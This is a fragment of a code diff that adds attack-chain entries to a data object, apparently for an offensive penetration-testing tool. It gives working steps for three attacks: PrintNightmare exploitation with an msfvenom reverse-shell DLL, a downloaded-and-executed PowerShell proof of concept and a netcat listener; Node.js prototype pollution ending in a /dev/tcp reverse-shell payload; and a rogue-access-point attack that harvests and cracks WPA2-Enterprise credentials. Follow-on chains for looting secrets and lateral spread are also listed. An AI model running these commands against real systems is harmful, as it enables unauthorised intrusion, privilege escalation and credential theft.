+        "cve-2021-34527",
+        "classic-windows"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_ip",
+          "description": "Target host with the Print Spooler service running.",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user"
+        },
+        {
+          "name": "password",
+          "source": "target_context.password"
+        }
+      ],
+      "steps": [
+        {
+          "id": "spooler_check",
+          "name": "Confirm Spooler is running",
+          "command_ref": "nxc-smb-printnightmare",
+          "inputs": {
+            "ip": "${target_ip}"
+          },
+          "notes": "The module probes for an open Spooler RPC interface AND tries the\nvuln check. `[+] VULNERABLE` is the green light. If patched, the\nmodule says so explicitly.\n"
+        },
+        {
+          "id": "stage_payload_dll",
+          "name": "Stage a SYSTEM-spawning DLL on a writable share",
+          "inline_command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o /tmp/x.dll\n# Host on an SMB share readable by SYSTEM:\nimpacket-smbserver share /tmp -smb2support\n",
+          "inputs": {
+            "lhost": "${attacker_ip}",
+            "lport": "4444"
+          }
+        },
+        {
+          "id": "trigger_local",
+          "name": "Local exploit (any logged-in user)",
+          "inline_command": "# CubeSec PowerShell PoC:\npowershell -ep bypass -c \"iex (iwr https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1).Content; Invoke-Nightmare -DriverName 'PwnedDriver' -NewUser 'pwned' -NewPassword 'Pwn3d!CTF'\"\n",
+          "notes": "Creates a local admin `pwned`/`Pwn3d!CTF`. Then runas /user:pwned cmd.\n"
+        },
+        {
+          "id": "trigger_remote",
+          "name": "Remote exploit (low-priv domain user)",
+          "inline_command": "python3 CVE-2021-1675.py '<domain>/<user>:<password>'@<target> '\\\\<attacker_ip>\\share\\x.dll'\n",
+          "inputs": {
+            "domain": "${user}",
+            "user": "${user}",
+            "password": "${password}",
+            "target": "${target_ip}",
+            "attacker_ip": "${attacker_ip}"
+          },
+          "notes": "Spooler on the target reaches back to your SMB share, downloads\nx.dll, loads it as SYSTEM. Reverse shell pops back as NT AUTHORITY\\SYSTEM.\n"
+        },
+        {
+          "id": "catch_shell",
+          "name": "Catch the SYSTEM reverse shell",
+          "inline_command": "nc -lvnp <lport>",
+          "inputs": {
+            "lport": "4444"
+          }
+        },
+        {
+          "id": "confirm",
+          "name": "Confirm SYSTEM",
+          "inline_command": "whoami"
+        }
+      ],
+      "references": [
+        {
+          "title": "PrintNightmare write-up (cube0x0)",
+          "url": "https://github.com/cube0x0/CVE-2021-1675"
+        },
+        {
+          "title": "CVE-2021-34527",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "dpapi-secrets-extraction",
+          "reason": "SYSTEM → loot the box."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "NTLM hashes captured locally",
+          "reason": "Spread the harvested identities."
+        }
+      ]
+    },
+    {
+      "id": "prototype-pollution-rce",
+      "name": "Web — JavaScript prototype pollution → RCE",
+      "description": "Server-side Node apps that recursively merge user input into objects (lodash.merge, jQuery.extend(true), $.extend) can have Object.prototype poisoned. Many libraries then read that polluted property as a config knob → flip it to spawn a shell.\n",
+      "tags": [
+        "web",
+        "javascript",
+        "nodejs",
+        "prototype-pollution",
+        "rce"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "target_url",
+          "description": "Endpoint that accepts JSON and merges it into objects (often /api/profile, /api/settings).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "detect_pollution",
+          "name": "Detect pollution via __proto__",
+          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"polluted\":\"yes\"}}'\n# Then fetch any endpoint that returns a fresh object and check whether\n# the response unexpectedly includes \"polluted\":\"yes\".\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Some apps strip `__proto__`. Try `constructor.prototype` instead:\n  {\"constructor\":{\"prototype\":{\"polluted\":\"yes\"}}}\n"
+        },
+        {
+          "id": "blind_detection",
+          "name": "Blind detection: pollute toString, watch for crash",
+          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"toString\":7}}'\n",
+          "notes": "If the next request fails with `TypeError: ... toString is not a function`\n→ confirmed pollution.\n"
+        },
+        {
+          "id": "rce_via_argv",
+          "name": "RCE via child_process gadget (most common payload)",
+          "inline_command": "# Many apps use child_process.spawn(...) with no options.shell;\n# polluting Object.prototype.shell = '/usr/bin/bash' (or true) +\n# NODE_OPTIONS gives RCE on the next spawn.\ncurl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"shell\":true,\"argv0\":\"sh\"}}'\n",
+          "inputs": {
+            "url": "${target_url}"
+          }
+        },
+        {
+          "id": "rce_via_env",
+          "name": "RCE via NODE_OPTIONS env var pollution",
+          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"NODE_OPTIONS\":\"--inspect-brk=0.0.0.0:9229 --require /tmp/payload.js\"}}'\n# Then either trigger any child_process call OR connect to inspect port:\n# chromium chrome://inspect → expose attach → RCE.\n"
+        },
+        {
+          "id": "gadget_lookup",
+          "name": "Find a known gadget for this app's framework",
+          "inline_command": "git clone https://github.com/BlackFan/client-side-prototype-pollution /tmp/cspp\n# And:\ngit clone https://github.com/yeswehack/pp-finder /tmp/pp-finder\n# The repos catalog gadgets per framework (Express, NestJS, Next.js, etc.)\n# Pick the one matching the target's stack and tailor the pollution payload.\n"
+        },
+        {
+          "id": "confirm_rce",
+          "name": "Trigger a reverse shell",
+          "inline_command": "# After pollution, trigger any endpoint that does spawn/exec internally.\n# Combined gadget example for Express (lodash.merge + NODE_OPTIONS):\ncurl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"AppData\":\"\\\\\\\".concat(process.mainModule.require(\\\"child_process\\\").execSync(\\\"bash -c \\\\\\\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\\\\\\"\\\")).concat(\\\".\"}}'\n",
+          "inputs": {
+            "url": "${target_url}",
+            "lhost": "${attacker_ip}",
+            "lport": "4444"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — Prototype pollution",
+          "url": "https://portswigger.net/web-security/prototype-pollution"
+        },
+        {
+          "title": "client-side-prototype-pollution gadgets",
+          "url": "https://github.com/BlackFan/client-side-prototype-pollution"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "reverse shell received",
+          "reason": "Stabilize."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "shell on Node host",
+          "reason": "Escalate from node user."
         }
       ]
     },
@@ -4052,6 +6737,103 @@ const CHAIN_DATA = {
           "chain": "alwaysinstallelevated",
           "when": "AlwaysInstallElevated registry = 1",
           "reason": "MSI elevation freebie."
+        }
+      ]
+    },
+    {
+      "id": "wpa2-enterprise-eaphammer",
+      "name": "Wireless — WPA2-Enterprise eaphammer rogue AP → cred harvest",
+      "description": "WPA2-Enterprise networks let you set up a rogue AP with the same ESSID; client devices auto-associate and try to authenticate, leaking the MSCHAPv2 challenge/response (EAP-PEAP, EAP-TTLS). Crack offline.\n",
+      "tags": [
+        "wireless",
+        "wpa2-enterprise",
+        "eap",
+        "mschapv2",
+        "initial-access"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_essid",
+          "description": "ESSID of the corporate Wi-Fi to impersonate.",
+          "required": true
+        },
+        {
+          "name": "wifi_interface",
+          "description": "Your wireless adapter (must support AP/monitor mode, e.g. wlan1).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "install_eaphammer",
+          "name": "Install eaphammer (one-time)",
+          "inline_command": "git clone https://github.com/s0lst1c3/eaphammer /opt/eaphammer\ncd /opt/eaphammer && sudo ./kali-setup\n./eaphammer --cert-wizard  # creates a default cert\n"
+        },
+        {
+          "id": "scan_for_target",
+          "name": "Confirm target ESSID + signal strength",
+          "inline_command": "sudo airodump-ng <iface>",
+          "inputs": {
+            "iface": "${wifi_interface}"
+          }
+        },
+        {
+          "id": "rogue_ap_attack",
+          "name": "Launch the rogue AP (PEAP/MSCHAPv2 harvest)",
+          "inline_command": "sudo ./eaphammer \\\n  --auth wpa-eap \\\n  --essid '<essid>' \\\n  --interface <iface> \\\n  --creds\n",
+          "inputs": {
+            "essid": "${target_essid}",
+            "iface": "${wifi_interface}"
+          },
+          "notes": "Wait for victim devices to associate. Watch stdout for\n\"Username: <user>\" + \"Challenge: ...\" + \"Response: ...\" blocks —\none per leaked client.\n",
+          "capture": [
+            {
+              "var": "mschapv2_handshake",
+              "regex": "Username:\\s+(\\S+)\\s+Challenge:\\s+([a-f0-9]+)\\s+Response:\\s+([a-f0-9]+)",
+              "match": "all",
+              "groups": {
+                "user": 1,
+                "challenge": 2,
+                "response": 3
+              }
+            }
+          ]
+        },
+        {
+          "id": "deauth_acceleration",
+          "name": "Force clients to re-associate (deauth)",
+          "inline_command": "# In another shell: deauth the target client(s) to trigger reconnect.\nsudo aireplay-ng --deauth 5 -a <ap_bssid> -c <client_mac> <iface>\n",
+          "inputs": {
+            "iface": "${wifi_interface}"
+          }
+        },
+        {
+          "id": "crack_offline",
+          "name": "Crack MSCHAPv2 with asleap / hashcat",
+          "inline_command": "# asleap (fastest for MSCHAPv2):\nasleap -C '<challenge>' -R '<response>' -W /usr/share/wordlists/rockyou.txt\n# Or hashcat mode 5500 (NetNTLMv1, same primitive):\nhashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "eaphammer",
+          "url": "https://github.com/s0lst1c3/eaphammer"
+        },
+        {
+          "title": "MSCHAPv2 cracking",
+          "url": "https://hashcat.net/wiki/doku.php?id=example_hashes"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "password-spray",
+          "when": "cracked plaintext",
+          "reason": "Corporate Wi-Fi creds usually map to AD users — spray to find Pwn3d!."
+        },
+        {
+          "chain": "ldap-anonymous-enum",
+          "when": "cracked plaintext + internal network access",
+          "reason": "Now you can enumerate AD from inside."
         }
       ]
     },
